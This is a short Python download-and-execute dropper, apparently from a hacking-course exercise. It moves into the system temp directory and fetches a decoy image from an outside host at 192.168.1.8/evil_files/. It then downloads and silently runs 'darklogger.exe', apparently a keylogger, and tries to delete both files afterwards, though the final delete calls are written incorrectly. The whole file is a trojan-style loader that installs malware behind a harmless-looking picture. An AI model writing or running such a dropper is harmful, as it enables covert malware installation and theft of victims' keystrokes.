#!/usr/bin/env python

import requests, subprocess, os, tempfile

def download(url):
    get_response = requests.get(url)
    print(get_response.content)
    file_name = url.split("/")[-1]
    with open(file_name, "wb") as out_file:
        out_file.write(get_response.content)


# os is also a cross platform module
# cross platform way of getting temp dir

temp_directory=tempfile.gettempdir()
os.chdir(temp_directory)

download("http://192.168.1.8/evil_files/gtr.jpg")
subprocess.Popen("gtr.jpg", shell=True)

download("http://192.168.1.8/evil_files/darklogger.exe")
subprocess.call("darklogger.exe", shell=True)

os.remove(gtr.jpg)
os.remove(darklogger.exe)